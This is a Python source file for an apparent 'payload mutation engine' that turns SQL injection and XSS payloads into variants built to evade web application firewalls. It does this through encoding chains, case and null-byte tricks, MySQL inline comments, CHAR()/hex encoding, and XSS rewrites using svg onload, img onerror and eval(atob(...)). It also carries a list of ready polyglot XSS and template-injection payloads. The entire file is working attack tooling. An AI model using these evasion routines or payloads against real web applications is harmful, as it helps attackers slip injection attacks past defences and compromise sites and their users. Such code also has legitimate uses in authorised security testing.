"""
Intelligent Payload Mutation Engine v5.0.

Transforms base payloads into WAF-evading variants using:
- Encoding chains (URL, double-URL, Unicode, hex, HTML entities, mixed)
- Case mutation (random case, alternating case)
- Whitespace injection (tabs, null bytes, inline comments)
- SQL-specific obfuscation (inline comments, CHAR(), CONCAT(), hex strings)
- XSS-specific obfuscation (event handlers, SVG/MathML, template literals)
- Polyglot generation (combined payloads for multi-context triggers)
- Context-aware mutation (param, body, header, JSON, cookie)
"""

import random
import string
import urllib.parse
import re
from itertools import product


class PayloadMutator:
    """Generates WAF-evading payload variants from base payloads."""

    # ── Encoding Methods ────────────────────────────────────────────────

    @staticmethod
    def url_encode(payload):
        """Standard URL encoding."""
        return urllib.parse.quote(payload, safe='')

    @staticmethod
    def double_url_encode(payload):
        """Double URL encoding (bypasses single-decode WAFs)."""
        return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')

    @staticmethod
    def unicode_encode(payload):
        """Unicode escape encoding."""
        result = []
        for ch in payload:
            if ch.isalpha():
                result.append(f"%u{ord(ch):04X}")
            else:
                result.append(urllib.parse.quote(ch, safe=''))
        return ''.join(result)

    @staticmethod
    def hex_encode(payload):
        """Hex encoding (%XX format)."""
        return ''.join(f'%{ord(c):02X}' for c in payload)

    @staticmethod
    def html_entity_encode(payload):
        """HTML entity encoding (decimal)."""
        return ''.join(f'&#{ord(c)};' for c in payload)

    @staticmethod
    def html_entity_hex_encode(payload):
        """HTML entity encoding (hex)."""
        return ''.join(f'&#x{ord(c):x};' for c in payload)

    @staticmethod
    def mixed_encode(payload):
        """Random mix of encoding methods per character."""
        methods = [
            lambda c: c,
            lambda c: urllib.parse.quote(c, safe=''),
            lambda c: f'&#{ord(c)};',
            lambda c: f'&#x{ord(c):x};',
        ]
        return ''.join(random.choice(methods)(c) for c in payload)

    # ── Case Mutation ───────────────────────────────────────────────────

    @staticmethod
    def random_case(payload):
        """Randomize case of alphabetic characters."""
        return ''.join(
            c.upper() if random.random() > 0.5 else c.lower()
            for c in payload
        )

    @staticmethod
    def alternating_case(payload):
        """Alternate case: ScRiPt → bypasses case-sensitive filters."""
        result = []
        alpha_idx = 0
        for c in payload:
            if c.isalpha():
                result.append(c.upper() if alpha_idx % 2 == 0 else c.lower())
                alpha_idx += 1
            else:
                result.append(c)
        return ''.join(result)

    # ── Whitespace / Null Injection ─────────────────────────────────────

    @staticmethod
    def tab_inject(payload):
        """Replace spaces with tabs."""
        return payload.replace(' ', '\t')

    @staticmethod
    def null_byte_inject(payload):
        """Insert null bytes before dangerous characters."""
        return payload.replace('<', '%00<').replace('>', '%00>')

    @staticmethod
    def newline_inject(payload):
        """Insert newlines to break WAF pattern matching."""
        return payload.replace(' ', '\r\n')

    @staticmethod
    def comment_inject_html(payload):
        """Insert HTML comments to break up keywords."""
        # Split <script> into <scr<!---->ipt>
        return re.sub(
            r'(script|alert|onerror|onload|onclick)',
            lambda m: m.group(0)[:3] + '<!-->' + m.group(0)[3:],
            payload, flags=re.IGNORECASE
        )

    # ── SQL-Specific Obfuscation ────────────────────────────────────────

    @staticmethod
    def sql_inline_comment(payload):
        """Add MySQL inline comments between SQL keywords."""
        keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR',
                     'INSERT', 'UPDATE', 'DELETE', 'DROP', 'ORDER', 'GROUP',
                     'HAVING', 'LIMIT', 'SLEEP', 'WAITFOR', 'BENCHMARK',
                     'CONCAT', 'CHAR', 'CAST', 'CONVERT']
        result = payload
        for kw in keywords:
            # Case-insensitive replacement with inline comment
            pattern = re.compile(re.escape(kw), re.IGNORECASE)
            result = pattern.sub(f'/*!50000{kw}*/', result)
        return result

    @staticmethod
    def sql_space_bypass(payload):
        """Replace SQL spaces with alternatives that work in MySQL/PostgreSQL."""
        alternatives = ['/**/','%09', '%0A', '%0D', '%0B', '%0C', '%A0', '+']
        replacement = random.choice(alternatives)
        return payload.replace(' ', replacement)

    @staticmethod
    def sql_char_encode(payload):
        """Convert string portions to CHAR()/CHR() calls."""
        # Find quoted strings and convert them
        def encode_str(m):
            s = m.group(1)
            chars = ','.join(str(ord(c)) for c in s)
            return f"CONCAT(CHAR({chars}))"
        return re.sub(r"'([^']+)'", encode_str, payload)

    @staticmethod
    def sql_hex_encode(payload):
        """Convert string portions to hex encoding (MySQL 0x...)."""
        def encode_str(m):
            s = m.group(1)
            hex_str = s.encode().hex()
            return f"0x{hex_str}"
        return re.sub(r"'([^']+)'", encode_str, payload)

    @staticmethod
    def sql_double_quotes(payload):
        """Switch single quotes to double quotes."""
        return payload.replace("'", '"')

    @staticmethod
    def sql_no_quotes(payload):
        """Remove quotes and use numeric comparison."""
        return payload.replace("'1'='1'", "1=1").replace("'1'='2'", "1=2")

    @staticmethod
    def sql_parenthesis_wrap(payload):
        """Wrap conditions in extra parentheses."""
        return payload.replace("OR ", "OR(").replace("AND ", "AND(") + ")" * payload.count("OR ") + ")" * payload.count("AND ")

    # ── XSS-Specific Obfuscation ────────────────────────────────────────

    @staticmethod
    def xss_svg_variant(payload):
        """Convert script-based XSS to SVG-based."""
        if '<script>' in payload.lower():
            return re.sub(
                r'<script[^>]*>.*?</script>',
                '<svg/onload=alert(1)>',
                payload, flags=re.IGNORECASE | re.DOTALL
            )
        return payload

    @staticmethod
    def xss_img_variant(payload):
        """Convert to img-based XSS."""
        if '<script>' in payload.lower():
            return re.sub(
                r'<script[^>]*>.*?</script>',
                '<img src=x onerror=alert(1)>',
                payload, flags=re.IGNORECASE | re.DOTALL
            )
        return payload

    @staticmethod
    def xss_details_variant(payload):
        """Convert to details/summary based XSS."""
        if '<script>' in payload.lower():
            return re.sub(
                r'<script[^>]*>.*?</script>',
                '<details open ontoggle=alert(1)>',
                payload, flags=re.IGNORECASE | re.DOTALL
            )
        return payload

    @staticmethod
    def xss_backtick_variant(payload):
        """Replace parentheses with backticks (bypasses some WAFs)."""
        return payload.replace('alert(1)', 'alert`1`').replace('alert(document.cookie)', 'alert`1`')

    @staticmethod
    def xss_constructor_variant(_payload):
        """Use constructor-based execution (bypasses many filters)."""
        return '"><img src=x onerror="this.constructor.constructor(\'alert(1)\')()">'

    @staticmethod
    def xss_eval_fromcharcode(payload):
        """Encode alert payload using String.fromCharCode."""
        return '<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">'

    @staticmethod
    def xss_atob_variant(_payload):
        """Use atob() to decode base64-encoded payload."""
        return '<img src=x onerror="eval(atob(\'YWxlcnQoMSk=\'))">'

    # ── Polyglot Generation ─────────────────────────────────────────────

    POLYGLOT_PAYLOADS = [
        # Works in HTML attribute, JS string, and URL contexts
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik%%0terik%%0D%%0A%%0d%%0a//oNmouseoVer=alert()//\\x3csVg/telerik\\x3e",
        # XSS polyglot
        "'\"-->]]>*/</script></style></title></textarea></noscript></template></select><svg/onload=alert(1)>",
        # SQLi + XSS polyglot
        "'-alert(1)-'",
        "{{7*7}}${7*7}<%= 7*7 %>#{7*7}",  # SSTI polyglot
        # Minimal polyglot
        "'\"<script>alert(1)</script>",
        # URL + JS context polyglot
        "javascript:alert(1)//\"><svg/onload=alert(1)>",
    ]

    # ── Context-Aware Mutation ──────────────────────────────────────────

    def _get_mutations_for_context(self, context):
        """Return applicable mutation functions based on injection context."""
        base_mutations = [
            self.url_encode, self.random_case, self.alternating_case,
        ]

        context_mutations = {
            "param": [
                self.double_url_encode, self.unicode_encode,
                self.mixed_encode, self.null_byte_inject,
            ],
            "body": [
                self.html_entity_encode, self.html_entity_hex_encode,
                self.tab_inject, self.newline_inject,
            ],
            "header": [
                self.tab_inject, self.newline_inject,
            ],
            "json": [
                self.unicode_encode,
            ],
            "cookie": [
                self.url_encode, self.double_url_encode,
            ],
            "sql": [
                self.sql_inline_comment, self.sql_space_bypass,
                self.sql_char_encode, self.sql_hex_encode,
                self.sql_double_quotes, self.sql_no_quotes,
                self.sql_parenthesis_wrap,
            ],
            "xss": [
                self.xss_svg_variant, self.xss_img_variant,
                self.xss_details_variant, self.xss_backtick_variant,
                self.xss_constructor_variant, self.xss_eval_fromcharcode,
                self.xss_atob_variant, self.comment_inject_html,
                self.html_entity_encode, self.html_entity_hex_encode,
            ],
        }

        mutations = base_mutations + context_mutations.get(context, [])
        return mutations

    # ── Public API ──────────────────────────────────────────────────────

    def mutate(self, payload, context="param", intensity=3):
        """
        Generate mutated variants of a base payload.

        Args:
            payload: The base payload string
            context: One of "param", "body", "header", "json", "cookie", "sql", "xss"
            intensity: 1=few (3-5), 2=moderate (5-10), 3=aggressive (10-20)

        Returns:
            List of unique mutated payload strings (always includes the original)
        """
        mutations = self._get_mutations_for_context(context)

        # Always include original
        results = {payload}

        # Number of variants based on intensity
        max_variants = {1: 5, 2: 10, 3: 20}.get(intensity, 10)

        # Apply each mutation function
        for mutate_fn in mutations:
            if len(results) >= max_variants:
                break
            try:
                variant = mutate_fn(payload)
                if variant and variant != payload:
                    results.add(variant)
            except Exception:
                continue

        # At higher intensity, apply chains of 2 mutations
        if intensity >= 2:
            mutation_pairs = list(product(mutations[:5], mutations[5:]))
            random.shuffle(mutation_pairs)
            for fn1, fn2 in mutation_pairs[:max_variants - len(results)]:
                if len(results) >= max_variants:
                    break
                try:
                    variant = fn2(fn1(payload))
                    if variant and variant != payload:
                        results.add(variant)
                except Exception:
                    continue

        return list(results)[:max_variants]

    def mutate_sql(self, payload, intensity=3):
        """SQL-specific mutation shorthand."""
        return self.mutate(payload, context="sql", intensity=intensity)

    def mutate_xss(self, payload, intensity=3):
        """XSS-specific mutation shorthand."""
        return self.mutate(payload, context="xss", intensity=intensity)

    def get_polyglots(self):
        """Return pre-built polyglot payloads."""
        return list(self.POLYGLOT_PAYLOADS)

    def generate_canary(self, length=10):
        """Generate a unique canary string for reflection detection."""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


# ── Singleton instance ──────────────────────────────────────────────────
mutator = PayloadMutator()
